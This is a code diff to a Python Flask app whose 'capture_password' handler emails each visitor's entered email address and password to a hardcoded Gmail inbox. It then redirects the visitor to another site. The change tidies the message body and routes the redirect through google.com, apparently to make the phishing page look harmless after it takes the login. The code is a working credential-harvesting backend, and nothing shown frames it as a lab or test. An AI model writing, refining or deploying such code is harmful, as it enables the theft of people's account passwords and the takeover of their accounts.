@@ -33,16 +33,20 @@ def capture_password():
         # Send email using Flask-Mail
         recipient = 'smartdevtechemail@gmail.com'  # Your email address to receive the email
         subject = 'Login'
-        body =body = f'Email: {email}\nPassword entered: {password}'
+        body = f'Email: {email}\nPassword entered: {password}'
 
         msg = Message(subject, sender=app.config['MAIL_USERNAME'], recipients=[recipient])
         msg.body = body
 
         try:
             mail.send(msg)
-            return redirect('https://hdtoday.tv/')
+            return redirect(url_for('external_redirect'))
         except Exception as e:
             return str(e)
+
+@app.route('/redirect')
+def external_redirect():
+    return redirect('https://www.google.com')
 
 if __name__ == '__main__':
     app.run(debug=True)
